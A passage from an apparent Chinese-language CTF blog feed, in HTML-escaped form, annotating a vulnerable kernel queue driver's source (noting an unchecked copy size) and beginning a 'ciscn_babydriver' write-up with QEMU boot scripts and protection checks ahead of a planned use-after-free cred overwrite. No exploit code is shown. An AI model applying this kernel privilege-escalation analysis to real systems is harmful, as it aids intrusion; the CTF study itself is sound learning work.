class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;/* If kqueue entry found , do the necessary */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(kqueue_entry &amp;amp;&amp;amp; request.data &amp;amp;&amp;amp; &lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;data_size)&amp;#123;&lt;span class=&#34;comment&#34;&gt;//节点存在，data指针不为空，&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(kqueue_entry-&amp;gt;idx == request.entry_idx)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                validate(&lt;span class=&#34;built_in&#34;&gt;memcpy&lt;/span&gt;(kqueue_entry-&amp;gt;data,request.data,&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;data_size));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                exists = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        kqueue_entry = kqueue_entry-&amp;gt;next;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* What if the idx is 0, it means we have to update the main kqueue&amp;#x27;s data */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(request.entry_idx==&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; kqueue_entry &amp;amp;&amp;amp; request.data &amp;amp;&amp;amp; &lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;data_size)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        validate(&lt;span class=&#34;built_in&#34;&gt;memcpy&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;data,request.data,&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;data_size));&lt;span class=&#34;comment&#34;&gt;//memcpy返回的是queue-&amp;gt;data&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!exists)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; NOT_EXISTS;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里要注意下头部也是可以保存信息的，但是目前还未看到漏洞。&lt;/p&gt;
&lt;h3 id=&#34;save_kqueue_entries&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#save_kqueue_entries&#34;&gt;#&lt;/a&gt; save_kqueue_entries&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;static&lt;/span&gt; noinline &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;save_kqueue_entries&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;request_t&lt;/span&gt; request)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Check for out of bounds queue_idx requests */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(request.queue_idx &amp;gt; MAX_QUEUES)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] Invalid kqueue idx&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Check if queue is already saved or not */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(isSaved[request.queue_idx]==&lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;)				&lt;span class=&#34;comment&#34;&gt;//isSaved一个bool类型的数组&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] Queue already saved&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt; *&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt; = validate(kqueues[request.queue_idx]);	&lt;span class=&#34;comment&#34;&gt;//检查参数值是否为空的函数validate&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Check if number of requested entries exceed the existing entries */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(request.max_entries &amp;lt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; || request.max_entries &amp;gt; &lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;max_entries)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] Invalid entry count&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Allocate memory for the kqueue to be saved */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *new_queue = validate((&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)kzalloc(&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;queue_size,GFP_KERNEL));&lt;span class=&#34;comment&#34;&gt;//新开一个空间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Each saved entry can have its own size */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(request.data_size &amp;gt; &lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;queue_size)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] Entry size limit exceed&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Copy main&amp;#x27;s queue&amp;#x27;s data */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;data &amp;amp;&amp;amp; request.data_size)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        validate(&lt;span class=&#34;built_in&#34;&gt;memcpy&lt;/span&gt;(new_queue,&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;data,request.data_size));&lt;span class=&#34;comment&#34;&gt;//没有检查size，&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] Internal error&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    new_queue += &lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;data_size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Get to the entries of the kqueue */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    queue_entry *kqueue_entry = (queue_entry *)(&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt; + (&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;)+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)/&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* copy all possible kqueue entries */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(i=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;i&amp;lt;request.max_entries+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;i++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!kqueue_entry || !kqueue_entry-&amp;gt;data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(kqueue_entry-&amp;gt;data &amp;amp;&amp;amp; request.data_size)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            validate(&lt;span class=&#34;built_in&#34;&gt;memcpy&lt;/span&gt;(new_queue,kqueue_entry-&amp;gt;data,request.data_size));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] Internal error&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        kqueue_entry = kqueue_entry-&amp;gt;next;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        new_queue += &lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;data_size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Mark the queue as saved */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    isSaved[request.queue_idx] = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/05/02/ciscn-babydriver/</guid>
            <title>ciscn_babydriver</title>
            <link>http://example.com/2022/05/02/ciscn-babydriver/</link>
            <category>learning</category>
            <pubDate>Mon, 02 May 2022 14:36:45 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;ciscn_babydriveruaf修改自身的cred&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ciscn_babydriveruaf修改自身的cred&#34;&gt;#&lt;/a&gt; ciscn_babydriver	uaf,	修改自身的 cred&lt;/h1&gt;
&lt;h2 id=&#34;保护检查&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#保护检查&#34;&gt;#&lt;/a&gt; 保护检查：&lt;/h2&gt;
&lt;h3 id=&#34;qemu&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#qemu&#34;&gt;#&lt;/a&gt; qemu&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;dreamcat@ubuntu:~/Desktop/kernel/babydriver$ &lt;span class=&#34;built_in&#34;&gt;cat&lt;/span&gt; boot.sh &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#!/bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;qemu-system-x86_64 -initrd fs.cpio -kernel bzImage -append &lt;span class=&#34;string&#34;&gt;&amp;#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&amp;#x27;&lt;/span&gt; -enable-kvm -monitor /dev/null -m 128M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep -s&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;没有开启地址随机化以及隔离保护&lt;/p&gt;
&lt;h3 id=&#34;驱动文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#驱动文件&#34;&gt;#&lt;/a&gt; 驱动文件&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#!/bin/sh&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mount -t proc none /proc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mount -t sysfs none /sys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mount -t devtmpfs devtmpfs /dev&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;chown&lt;/span&gt; root:root flag&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;chmod&lt;/span&gt; 400 flag&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;exec&lt;/span&gt; 0&amp;lt;/dev/console&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;exec&lt;/span&gt; 1&amp;gt;/dev/console&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;exec&lt;/span&gt; 2&amp;gt;/dev/console&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;insmod /lib/modules/4.4.72/babydriver.ko&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;chmod&lt;/span&gt; 777 /dev/babydev&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; -e &lt;span class=&#34;string&#34;&gt;&amp;quot;\nBoot took &lt;span class=&#34;subst&#34;&gt;$(cut -d&amp;#x27; &amp;#x27; -f1 /proc/uptime)&lt;/span&gt; seconds\n&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;setsid cttyhack setuidgid 1000 sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;umount /proc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;umount /sys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;poweroff -d 0  -f&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在这里我们看到他的驱动的位置是在 /lib/modules/4.4.72/babydriver.ko&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;dreamcat@ubuntu:~/Desktop/kernel/babydriver/lib/modules/4.4.72$ checksec babydriver.ko&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] &lt;span class=&#34;string&#34;&gt;&amp;#x27;/home/dreamcat/Desktop/kernel/babydriver/lib/modules/4.4.72/babydriver.ko&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Arch:     amd64-64-little&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RELRO:    No RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Stack:    No canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    NX:       NX enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    PIE:      No PIE (0x0)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;vmlinux&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#vmlinux&#34;&gt;#&lt;/a&gt; vmlinux&lt;/h3&gt;
&lt;p&gt;我们提取出来 vmlinux 后，extract-vmlinux bzImage &amp;gt; vmlinux&lt;/p&gt;
&lt;p&gt;进行检查，发现保护什么也没有开。&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;dreamcat@ubuntu:~/Desktop/kernel/babydriver$ checksec vmlinux&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] &lt;span class=&#34;string&#34;&gt;&amp;#x27;/home/dreamcat/Desktop/kernel/babydriver/vmlinux&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Arch:     amd64-64-little&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RELRO:    No RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Stack:    No canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    NX:       NX disabled&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    PIE:      No PIE (0xffffffff81000000)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RWX:      Has RWX segments&lt;/span&gt;&lt;br&gt;&lt;span 